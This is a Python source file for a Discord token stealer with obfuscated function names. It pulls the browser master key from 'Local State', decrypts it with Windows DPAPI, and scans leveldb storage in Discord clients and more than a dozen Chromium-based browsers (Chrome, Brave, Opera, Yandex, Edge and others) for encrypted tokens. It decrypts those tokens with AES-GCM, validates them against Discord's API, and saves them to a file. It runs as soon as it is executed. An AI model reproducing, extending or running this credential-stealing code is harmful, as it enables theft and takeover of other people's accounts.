import os
import re
import json
import base64
import threading
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from urllib.request import urlopen, Request

# Global variable to store tokens
T0K3Ns = []

def D3CrYP7V41U3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16]  # Removing the tag (last 16 bytes)
        try:
            decrypted_pass = decrypted_pass.decode()
        except:
            pass
        return decrypted_pass

def CH3CK70K3N(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

def G37D15C0rD(path, arg):
    if not os.path.exists(f"{path}/Local State"):
        return
    pathC = path + arg
    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: 
        local_state = json.loads(f.read())
    
    # Extract the master key and decrypt it
    master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])[1]

    # Iterate through all the files in the directory and decrypt tokens
    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb"):
            file_path = os.path.join(pathC, file)
            with open(file_path, errors="ignore") as f:
                for line in f.readlines():
                    line = line.strip()
                    if line:
                        # Regex to find potential Discord tokens
                        for token in re.findall(r"dQw4w9WgXcQ:[^\" ]+", line):
                            token_decoded = D3CrYP7V41U3(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                            
                            # Check if the token is valid
                            if CH3CK70K3N(token_decoded):
                                if token_decoded not in T0K3Ns:
                                    T0K3Ns.append(token_decoded)
                                    write_token_to_file(token_decoded)  # Write the token to a file

def write_token_to_file(token):
    # Write the token to a file
    with open("discord_tokens.txt", "a") as f:
        f.write(f"{token}\n")
    print(f"Token written to discord_tokens.txt: {token}")

def extract_discord_tokens():
    # Define the paths for Discord-related applications
    d15C0rDP47H5 = [
        [f"{os.getenv('APPDATA')}/discord", "/Local Storage/leveldb"],
        [f"{os.getenv('APPDATA')}/Lightcord", "/Local Storage/leveldb"],
        [f"{os.getenv('APPDATA')}/discordcanary", "/Local Storage/leveldb"],
        [f"{os.getenv('APPDATA')}/discordptb", "/Local Storage/leveldb"]
    ]

    # Loop through each possible path
    for discord_path, arg in d15C0rDP47H5:
        threading.Thread(target=G37D15C0rD, args=(discord_path, arg)).start()

    # Wait for all threads to finish
    for thread in threading.enumerate():
        if thread != threading.main_thread():
            thread.join()

    # Print out the found tokens (for debugging)
    print(f"Extracted Tokens: {T0K3Ns}")

# Example of how the browser extraction code might be integrated into this script

def G47H3r411():
    roaming = os.getenv("APPDATA")
    local = os.getenv("LOCALAPPDATA")

    br0W53rP47H5 = [
        [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/"],
        [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/"],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/"],
        [f"{local}/Google/Chrome/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [f"{local}/Google/Chrome SxS/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [f"{local}/Google/Chrome Beta/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [f"{local}/Google/Chrome Dev/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [f"{local}/Google/Chrome Unstable/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [f"{local}/Google/Chrome Canary/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [f"{local}/Vivaldi/User Data", "vivaldi.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"],
        [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/HougaBouga/"],
        [f"{local}/Yandex/YandexBrowserCanary/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/HougaBouga/"],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/HougaBouga/"],
        [f"{local}/Yandex/YandexBrowserBeta/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/HougaBouga/"],
        [f"{local}/Yandex/YandexBrowserTech/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/HougaBouga/"],
        [f"{local}/Yandex/YandexBrowserSxS/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/HougaBouga/"],
        [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/"]
    ]

    for patt in br0W53rP47H5:
        threading.Thread(target=G37D15C0rD, args=(patt[0], patt[2])).start()

    # Wait for all threads to finish
    for thread in threading.enumerate():
        if thread != threading.main_thread():
            thread.join()

    print(f"Extracted Tokens: {T0K3Ns}")

# Run the extraction process
extract_discord_tokens()
G47H3r411()
